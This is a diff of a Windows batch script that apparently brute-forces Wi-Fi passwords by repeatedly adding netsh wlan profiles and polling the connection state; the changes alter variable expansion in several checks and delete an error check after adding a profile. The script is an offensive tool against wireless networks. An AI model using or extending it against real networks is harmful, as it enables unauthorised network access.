@@ -404,7 +404,7 @@ goto :mainmenu
 :scan
     cls
 
-    if "!interface_id!" equ "not_defined" (
+    if "%interface_id%" equ "not_defined" (
         call :color_echo . red "You have to select an interface to perform a scan"
         set wifi_target=not_defined
         echo.
@@ -413,7 +413,7 @@ goto :mainmenu
         goto :eof
     )
 
-    netsh wlan disconnect interface="!interface_id!" > nul
+    netsh wlan disconnect interface="%interface_id%" > nul
 
     :scan_wait_disconnected_loop
     call :interface_find_state
@@ -570,9 +570,6 @@ goto :eof
         del /Q /F importwifi.xml 2>nul
         call :importwifi_write
         netsh wlan add profile filename="importwifi.xml" interface="!interface_id!" >nul
-        if %errorlevel% neq 0 (
-            call :exit_fatal "Cannot add profile"
-        )
         cls
         echo.
         call :color_echo . cyan "Attacking"
@@ -717,29 +714,29 @@ goto :eof
         set interface_state=none
         call :interface_find_state
 
-        if "!interface_state!"=="disconnecting" (
+        if "%interface_state%"=="disconnecting" (
             call :color_echo . red "Timeout"
             echo.
         )
-        if "!interface_state!"=="disconnected" (
+        if "%interface_state%"=="disconnected" (
             call :color_echo . red "Timeout"
             echo.
         )
-        if "!interface_state!"=="authenticating" (
+        if "%interface_state%"=="authenticating" (
             call :color_echo . blue "Authenticating"
             echo.
         )
-        if "!interface_state!"=="connecting" (
+        if "%interface_state%"=="connecting" (
             call :color_echo . yellow "Connecting"
             echo.
         )
-        if "!interface_state!"=="connected" (
+        if "%interface_state%"=="connected" (
             call :color_echo . green "Connected"
             echo.
             timeout /t 2 /nobreak>nul
         )
 
-        if "!interface_state!" equ "authenticating" (
+        if "%interface_state%" equ "authenticating" (
             if "!attack_authenticating_detected!" equ "false" (
                 set /a attack_counter=!attack_counter!+5
                 set attack_authenticating_detected=true
